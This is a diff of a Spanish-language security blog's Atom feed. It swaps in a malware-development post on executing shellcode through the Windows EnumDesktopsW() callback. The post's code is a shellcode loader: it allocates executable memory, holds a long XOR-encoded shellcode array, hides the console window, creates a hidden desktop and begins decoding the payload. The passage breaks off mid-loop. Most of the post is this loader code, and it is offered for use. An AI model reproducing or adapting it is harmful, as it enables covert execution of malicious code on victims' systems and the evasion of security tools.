@@ -1,4 +1,183 @@
-<?xml version="1.0" encoding="utf-8"?><?xml-stylesheet type="text/xml" href="http://localhost:4000/feed.xslt.xml"?><feed xmlns="http://www.w3.org/2005/Atom"><generator uri="http://jekyllrb.com" version="3.9.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-07-06T12:17:50-06:00</updated><id>http://localhost:4000/</id><title type="html">c4rta</title><subtitle>Soy Omar, un amante de la ciberseguridad y las radiocomunicaciones</subtitle><entry><title type="html">Un Poco de Pentesting - Session Fixation</title><link href="http://localhost:4000/UPDP-session-fixation/" rel="alternate" type="text/html" title="Un Poco de Pentesting - Session Fixation" /><published>2023-07-05T00:00:00-06:00</published><updated>2023-07-05T00:00:00-06:00</updated><id>http://localhost:4000/UPDP-session-fixation</id><content type="html" xml:base="http://localhost:4000/UPDP-session-fixation/">&lt;p class=&quot;lead&quot;&gt;Te explicare como funciona el ataque Session Fixation con el que podremos robar/secuestrar la sesion de otra persona&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><?xml-stylesheet type="text/xml" href="http://localhost:4000/feed.xslt.xml"?><feed xmlns="http://www.w3.org/2005/Atom"><generator uri="http://jekyllrb.com" version="3.9.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-07-09T11:37:40-06:00</updated><id>http://localhost:4000/</id><title type="html">c4rta</title><subtitle>Soy Omar, un amante de la ciberseguridad y las radiocomunicaciones</subtitle><entry><title type="html">Inyeccion de procesos/codigo - Ejecucion de shellcodes via EnumDesktopsW()</title><link href="http://localhost:4000/maldev-enumDesktopsW/" rel="alternate" type="text/html" title="Inyeccion de procesos/codigo - Ejecucion de shellcodes via EnumDesktopsW()" /><published>2023-07-07T00:00:00-06:00</published><updated>2023-07-07T00:00:00-06:00</updated><id>http://localhost:4000/maldev-enumDesktopsW</id><content type="html" xml:base="http://localhost:4000/maldev-enumDesktopsW/">&lt;p class=&quot;lead&quot;&gt;Te explicare como use la funcion de callback &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EnumDesktopsW()&lt;/code&gt; para ejecutar una shellcode en un escritorio creado con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CreateDesktopW()&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&quot;enumdesktopsw&quot;&gt;EnumDesktopsW&lt;/h2&gt;
+
+&lt;p&gt;EnumDesktopsW es una funcion de la WinAPI la cual enumera todos los escritorios del usuario, cabe recalcar que solo enumera los cuales tengan acceso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DESKTOP_ENUMERATE&lt;/code&gt; o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GENERIC_ALL&lt;/code&gt;, lo que hace por detras esta funcion es invocar multiples veces a la funcion callback &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lpEnumFunc&lt;/code&gt; hasta que termine de enumerar todos los escritorios.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lpEnumFunc&lt;/code&gt; es uno de los parametros que recibe &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EnumDesktopsW()&lt;/code&gt;, esta callback define a si misma&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DESKTOPENUMPROC&lt;/code&gt; como un puntero a la funcion de callback. su sintaxis es:&lt;/p&gt;
+
+&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;BOOL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CALLBACK&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EnumDesktopProc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;_In_&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LPTSTR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lpszDesktop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;_In_&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LPARAM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lParam&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;como-se-ejecuta-la-shellcode&quot;&gt;¿Como se ejecuta la shellcode?&lt;/h3&gt;
+
+&lt;p&gt;Basicamente hace esto:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Se asigna un buffer de memoria mediante una función como VirtualAlloc&lt;/li&gt;
+  &lt;li&gt;Se copia la shellcode en la memoria recién asignada&lt;/li&gt;
+  &lt;li&gt;Se usa EnumDesktopsW para enumerar los escritorios y mediante una funcion callback encontrar la dirección de una función que se puede usar para ejecutar el shellcode (La direccion que regresa VirtualAlloc)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;El codigo “base” para ejecutar una shellcode de esta forma tomando en cuenta la explicacion anterior, es:&lt;/p&gt;
+
+&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hAlloc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;VirtualAlloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MEM_COMMIT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MEM_RESERVE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PAGE_EXECUTE_READWRITE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;memcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hAlloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;EnumDesktopsW&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GetProcessWindowStation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DESKTOPENUMPROCW&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hAlloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Pero nos vamos a poner tryhards y te voy a explicar como usando ese mismo codigo de base lo converti en algo bien genial&lt;/p&gt;
+
+&lt;h3 id=&quot;explicacion&quot;&gt;Explicacion&lt;/h3&gt;
+
+&lt;p&gt;Como en los demas tutoriales, te pondre todo el codigo y te explicare que hacen las funciones y como se ejecuta la shellcode&lt;/p&gt;
+
+&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;Windows.h&amp;gt;
+#include &amp;lt;iostream&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+	&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x92\x26\xed\x8a\x9e\x86\xa2\x6e\x6e\x6e\x2f\x3f\x2f\x3e&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x3c\x3f\x26\x5f\xbc\x0b\x26\xe5\x3c\x0e\x26\xe5\x3c\x76&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x38\x26\xe5\x3c\x4e\x23\x5f\xa7\x26\xe5\x1c\x3e\x26\x61&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xd9\x24\x24\x26\x5f\xae\xc2\x52\x0f\x12\x6c\x42\x4e\x2f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xaf\xa7\x63\x2f\x6f\xaf\x8c\x83\x3c\x26\xe5\x3c\x4e\xe5&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x2c\x52\x2f\x3f\x26\x6f\xbe\x08\xef\x16\x76\x65\x6c\x61&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xeb\x1c\x6e\x6e\x6e\xe5\xee\xe6\x6e\x6e\x6e\x26\xeb\xae&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x1a\x09\x26\x6f\xbe\xe5\x26\x76\x3e\x2a\xe5\x2e\x4e\x27&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x6f\xbe\x8d\x38\x23\x5f\xa7\x26\x91\xa7\x2f\xe5\x5a\xe6&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x26\x6f\xb8\x26\x5f\xae\xc2\x2f\xaf\xa7\x63\x2f\x6f\xaf&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x56\x8e\x1b\x9f\x22\x6d\x22\x4a\x66\x2b\x57\xbf\x1b\xb6&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x36\x2a\xe5\x2e\x4a\x27\x6f\xbe\x08\x2f\xe5\x62\x26\x2a&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xe5\x2e\x72\x27\x6f\xbe\x2f\xe5\x6a\xe6\x26\x6f\xbe\x2f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x36\x2f\x36\x30\x37\x34\x2f\x36\x2f\x37\x2f\x34\x26\xed&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x82\x4e\x2f\x3c\x91\x8e\x36\x2f\x37\x34\x26\xe5\x7c\x87&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x25\x91\x91\x91\x33\x27\xd0\x19\x1d\x5c\x31\x5d\x5c\x6e&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x6e\x2f\x38\x27\xe7\x88\x26\xef\x82\xce\x6f\x6e\x6e\x27&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xe7\x8b\x27\xd2\x6c\x6e\x7f\x32\xae\xc6\x6f\x27\x2f\x3a&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x27\xe7\x8a\x22\xe7\x9f\x2f\xd4\x22\x19\x48\x69\x91\xbb&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x22\xe7\x84\x06\x6f\x6f\x6e\x6e\x37\x2f\xd4\x47\xee\x05&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x6e\x91\xbb\x04\x64\x2f\x30\x3e\x3e\x23\x5f\xa7\x23\x5f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xae\x26\x91\xae\x26\xe7\xac\x26\x91\xae\x26\xe7\xaf\x2f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xd4\x84\x61\xb1\x8e\x91\xbb\x26\xe7\xa9\x04\x7e\x2f\x36&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x22\xe7\x8c\x26\xe7\x97\x2f\xd4\xf7\xcb\x1a\x0f\x91\xbb&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xeb\xae\x1a\x64\x27\x91\xa0\x1b\x8b\x86\xfd\x6e\x6e\x6e&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x26\xed\x82\x7e\x26\xe7\x8c\x23\x5f\xa7\x04\x6a\x2f\x36&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x26\xe7\x97\x2f\xd4\x6c\xb7\xa6\x31\x91\xbb\xed\x96\x6e&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x10\x3b\x26\xed\xaa\x4e\x30\xe7\x98\x04\x2e\x2f\x37\x06&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x6e\x7e\x6e\x6e\x2f\x36\x26\xe7\x9c\x26\x5f\xa7\x2f\xd4&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x36\xca\x3d\x8b\x91\xbb\x26\xe7\xad\x27\xe7\xa9\x23\x5f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xa7\x27\xe7\x9e\x26\xe7\xb4\x26\xe7\x97\x2f\xd4\x6c\xb7&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xa6\x31\x91\xbb\xed\x96\x6e\x13\x46\x36\x2f\x39\x37\x06&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x6e\x2e\x6e\x6e\x2f\x36\x04\x6e\x34\x2f\xd4\x65\x41\x61&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x5e\x91\xbb\x39\x37\x2f\xd4\x1b\x00\x23\x0f\x91\xbb\x27&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x91\xa0\x87\x52\x91\x91\x91\x26\x6f\xad\x26\x47\xa8\x26&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xeb\x98\x1b\xda\x2f\x91\x89\x36\x04\x6e\x37\x27\xa9\xac&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x9e\xdb\xcc\x38\x91\xbb&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BOOL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;WINAPI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ShellcodeFunction&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LPCWSTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LPARAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;WINAPI&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SwitchDesktopThread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LPVOID&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lpParameter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;HDESK&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hDesktop&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static_cast&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HDESK&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lpParameter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;SetThreadDesktop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hDesktop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;HWND&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hWin&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GetConsoleWindow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;ShowWindow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hWin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SW_HIDE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	
+    &lt;span class=&quot;n&quot;&gt;HDESK&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hDesktop&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CreateDesktopW&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;L&quot;ShellcodeDesk&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GENERIC_ALL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hDesktop&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hThread&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CreateThread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SwitchDesktopThread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hDesktop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hThread&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;CloseDesktop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hDesktop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        	&lt;span class=&quot;n&quot;&gt;CloseHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hThread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	
+	        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+	            &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;\x6e&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
